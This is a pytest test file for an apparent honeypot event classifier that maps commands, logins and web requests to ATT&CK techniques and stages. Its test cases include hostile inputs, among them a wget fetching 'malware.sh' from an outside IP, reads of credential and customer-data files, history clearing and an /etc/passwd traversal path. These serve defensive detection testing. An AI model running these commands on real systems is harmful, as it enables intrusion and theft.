import pytest
from app.engine.classify import classify, TECH, ORDER, RULES

def test_attack_map_integrity():
    assert len(TECH) >= 20
    assert len(RULES) == 23
    assert len(ORDER) == 10
    assert "recon" in ORDER
    assert "lateral_movement" in ORDER

@pytest.mark.parametrize("event_input,expected_tech,expected_stage,expected_flag", [
    (
        {"action": "command", "cmd": "ls /srv/backups"},
        "T1083", "discovery", None
    ),
    (
        {"action": "command", "cmd": "cat /srv/backups/customer_data_2026.csv"},
        "T1005", "collection", "crown_jewel"
    ),
    (
        {"action": "command", "cmd": "cat /home/dbadmin/notes.txt"},
        "T1552.001", "collection", None
    ),
    (
        {"action": "command", "cmd": "wget http://198.51.100.250/malware.sh"},
        "T1105", "execution", None
    ),
    (
        {"action": "command", "cmd": "history -c"},
        "T1070.003", "persistence", None
    ),
    (
        {"action": "auth", "outcome": "failure"},
        "T1110.001", "credential_attack", None
    ),
    (
        {"action": "auth", "outcome": "success"},
        "T1078.001", "initial_access", None
    ),
    (
        {"action": "auth", "outcome": "failure", "flags": ["honeytoken_use"]},
        "T1021.004", "lateral_movement", "honeytoken"
    ),
    (
        {"action": "auth", "outcome": "failure", "flags": ["sqli"]},
        "T1190", "initial_access", None
    ),
    (
        {"action": "web_request", "flags": ["traversal"], "cmd": "/../../etc/passwd"},
        "T1190", "initial_access", None
    ),
    (
        {"action": "web_request", "cmd": "/admin-backup/"},
        "T1595.003", "recon", "targeted_lure"
    ),
    (
        {"action": "command", "cmd": "foobar_random_binary"},
        "T1059.004", "execution", None
    ),
])
def test_table_driven_classification(event_input, expected_tech, expected_stage, expected_flag):
    classified = classify(event_input)
    assert expected_tech in classified["techniques"]
    assert classified["stage"] == expected_stage
    if expected_flag:
        assert expected_flag in classified["flags"]

def test_long_input_dos_guard():
    huge_cmd = "A" * 15000
    res = classify({"action": "command", "cmd": huge_cmd})
    assert "T1059.004" in res["techniques"]

def test_admin_lure_rule_does_not_match_unrelated_paths():
    classified = classify({"action": "web_request", "cmd": "/admin/"})
    assert "T1595.003" not in classified["techniques"]
    assert "targeted_lure" not in classified["flags"]
